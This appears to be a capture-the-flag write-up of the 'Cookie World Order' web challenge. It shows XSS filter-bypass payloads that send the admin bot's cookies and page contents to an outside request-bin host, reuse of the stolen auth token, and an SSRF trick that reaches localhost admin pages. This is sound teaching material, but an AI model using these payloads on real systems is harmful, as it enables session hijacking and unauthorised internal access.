Cookie World Order (**web**)

    Good job! You found a further credential that looks like a VPN 
    referred to as the cWo. The organization appears very clandestine 
    and mysterious and reminds you of the secret ruling class of hard 
    shelled turtle-like creatures of Xenon. Funny they trust their 
    security to a contractor outside their systems, especially one with 
    such bad habits. Upon further snooping you find a video feed of 
    those "Cauliflowers" which look to be the dominant lifeforms and 
    members of the cWo. Go forth and attain greater access to reach 
    this creature!

Similarly with day 3 web problem case, we have URL: https://cwo-xss.web.ctfcompetition.com/

Open it and observe very similar page with Admin entity and field for 
input some text message.

Trying to copy-paste previous solution:

    <script>
    var img=new Image();
    img.src="https://postb.in/1561479835927-8693528019357?cookie="+document.cookie;
    </script>

leads to reply "HACKER ALERT!".
After typing different strings it comes out that input must not contain 
`script` or `alert` as a substring. Well, modern WEB is full of tricks 
and wistles. If you (like me) have no expirience with web programming, 
Googling can compensate it. Just request something like "bypassing XSS 
filter".

First try:

    <scrip&#0000116>
    aler&#0000116('XSS');
    </scrip&#0000116>

Unfortunately, server removed `<script>` tag. Hm, maybe there are tags 
that are "allowed", do check:
    
    <b> bold </b> 
    <a href="google.com"> google </a> 
    <img src="https://cwo-xss.web.ctfcompetition.com/static/img/profile.png">

Yes, links and images work well! But links mostly requires user's 
actions, and we can be sure, that Admin bot will not click on any.
Now, back to the googling. And quickly find out that it is quite easy 
to call javascript from some event handlers, and if we can fire these 
events, then we can execute script. Common place is `onerror` event of 
`img` node, and it is very easy to fire error, just by giving it 
inproper source URL. Let's use our PostBin and try:

    <img src=x onerror="javascrip&#0000116:
    var img=new Image();
    img.src='https://postb.in/1561495195584-1681611498352?cookie='+document.cookie;">

... and back to PostBin:

    GET /1561495195584-1681611498352 2019-06-25T20:40:15.156Z
    Headers

        x-real-ip: 104.155.55.51
        host: postb.in
        connection: close
        pragma: no-cache
        cache-control: no-cache
        sec-fetch-mode: no-cors
        user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3827.0 Safari/537.36
        accept: image/webp,image/apng,image/*,*/*;q=0.8
        sec-fetch-site: cross-site
        referer: https://cwo-xss.web.ctfcompetition.com/exploit?reflect=%3Cimg%20src=x%20onerror=%22javascrip&
        accept-encoding: gzip, deflate, br

    Query

        cookie: flag=CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}; auth=TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz

    Body

Ok, the flag is

**CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}**


But what could we see in Admin panel with his auth token? Open 
WebConsole, do

    document.cookie="auth=TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz"

and click on "Admin" link. What we have here... Users and Livestreams 
seems empty. Camera Controls says requests are allowed only 
from 127.0.0.1 (localhost). Maybe those HeadlessChrome-bot is on the 
same host with server? Let's try to see how bot renders this page:

    <img src=x onerror="javascrip&#0000116:
    fetch('/admin/controls', {method: 'get'}).then((res) => { return res.text(); }).then((data) => {
          var img=new Image();img.src='https://postb.in/1561495316858-4828648881521?'+data;
    });">

Bad luck, he sees the same message:

    GET /1561495316858-4828648881521 2019-06-25T21:03:13.407Z
    Headers

        x-real-ip: 104.155.55.51
        host: postb.in
        connection: close
        pragma: no-cache
        cache-control: no-cache
        sec-fetch-mode: no-cors
        user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3827.0 Safari/537.36
        accept: image/webp,image/apng,image/*,*/*;q=0.8
        sec-fetch-site: cross-site
        referer: https://cwo-xss.web.ctfcompetition.com/exploit?reflect=%3Cimg%20src=x%20onerror=%22javascrip&
        accept-encoding: gzip, deflate, br

    Query

        Requests only accepted from 127.0.0.1: 

After some lurking on the main page we can see strange thing: video is 
linked with url `https://cwo-xss.web.ctfcompetition.com/watch?livestream=http://cwo-xss.web.ctfcompetition.com/livestream/garden-livestream.webm`

Why does it refer to the file with absolute path (and with no TLS)? Can 
this page show us any file all over the world? Try:

    https://cwo-xss.web.ctfcompetition.com/watch?livestream=http://google.com
    => Your only allowed to make requests to "http://cwo-xss.web.ctfcompetition.com" 

Ok then, it seems like server checks that requested page path starts 
with `http://cwo-xss.web.ctfcompetition.com`. In fact this check does 
not guarantee that URL's hostname is `cwo-xss.web.ctfcompetition.com`, 
because the full URI specification (RFC3986) states that after scheme 
(`http`), colon and two slashes goes *authority*, which has following 
format:

    [ userinfo "@" ] host [ ":" port ]

Thus we can use string `cwo-xss.web.ctfcompetition.com` as userinfo.
Actually we can append to it any additional characters, uncluding fake 
"password" for authentification (which hopefully will not needed). What 
is important is to add "@" character. After it we can add any host and 
port. Let's try:

    https://cwo-xss.web.ctfcompetition.com/watch?livestream=http://cwo-xss.web.ctfcompetition.com:passw0rd@google.com

Yes, we did it, we have free http proxy!
Cross fingers and request admin controls:

    https://cwo-xss.web.ctfcompetition.com/watch?livestream=http://cwo-xss.web.ctfcompetition.com:passw0rd@127.0.0.1/admin/controls

And there is second flag:

**CTF{WhatIsThisCookieFriendSpaceBookPlusAllAccessRedPremiumThingLooksYummy}**
